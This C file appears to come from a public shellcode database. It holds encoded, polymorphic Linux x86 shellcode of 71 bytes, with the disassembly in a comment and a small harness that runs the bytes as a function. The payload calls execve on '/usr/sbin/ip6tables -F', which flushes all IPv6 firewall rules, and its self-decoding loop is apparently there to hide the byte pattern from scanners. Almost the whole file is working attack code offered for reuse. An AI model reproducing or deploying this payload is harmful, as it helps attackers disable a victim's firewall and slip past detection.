/*  Linux x86 - polymorphic shellcode ip6tables -F - 71 bytes
 *  Jonathan Salwan < submit [!] shell-storm.org >
 *
 *	! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ !
 *
 *
 *  The Gnuser Project (Gnu Users Manager) => http://www.gnuser.org
 *
 * Disassembly of section .text:
 *
 * 08048054 <.text>:
 * 8048054:	6a 0b                	push   $0xb
 * 8048056:	58                   	pop    %eax
 * 8048057:	99                   	cltd
 * 8048058:	52                   	push   %edx
 * 8048059:	66 68 2d 46          	pushw  $0x462d
 * 804805d:	89 e1                	mov    %esp,%ecx
 * 804805f:	52                   	push   %edx
 * 8048060:	6a 73                	push   $0x73
 * 8048062:	66 68 6c 65          	pushw  $0x656c
 * 8048066:	68 36 74 61 62       	push   $0x62617436
 * 804806b:	68 6e 2f 69 70       	push   $0x70692f6e
 * 8048070:	68 2f 73 62 69       	push   $0x6962732f
 * 8048075:	68 2f 75 73 72       	push   $0x7273752f
 * 804807a:	89 e3                	mov    %esp,%ebx
 * 804807c:	52                   	push   %edx
 * 804807d:	51                   	push   %ecx
 * 804807e:	53                   	push   %ebx
 * 804807f:	89 e1                	mov    %esp,%ecx
 * 8048081:	cd 80                	int    $0x80
*/

#include <stdio.h>

int main(int argc, char *argv[])
{
char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x47\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
			"\x47\x8a\xe2\x53\x6b\x74\x67\x69"
			"\x6d\x66\x69\x37\x75\x62\x63\x69"
			"\x6f\x30\x6a\x71\x69\x30\x74\x63"
			"\x6a\x69\x30\x76\x74\x73\x8a\xe4"
			"\x53\x52\x54\x8a\xe2\xce\x81";

       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}